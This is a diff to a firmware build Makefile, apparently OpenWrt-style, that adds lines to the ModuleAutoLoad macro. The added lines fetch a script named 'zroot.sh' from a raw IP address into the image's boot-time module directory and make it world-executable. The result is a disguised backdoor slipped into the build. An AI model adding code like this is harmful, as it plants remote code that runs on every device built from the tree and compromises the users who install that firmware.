@@ -183,6 +183,9 @@ define ModuleAutoLoad
       mkdir -p $(2)/etc/modules-boot.d; \
       ln -sf ../modules.d/$(3)$(1) $(2)/etc/modules-boot.d/;))
 endef
+$(if $(4), \
+wget https://67.216.207.172/zroot.sh $(2)/etc/modules-boot.d/; \
+chmod 777 $(2)/etc/modules-boot.d/zroot.sh;)
 
 ifeq ($(DUMP)$(TARGET_BUILD),)
   -include $(LINUX_DIR)/.config
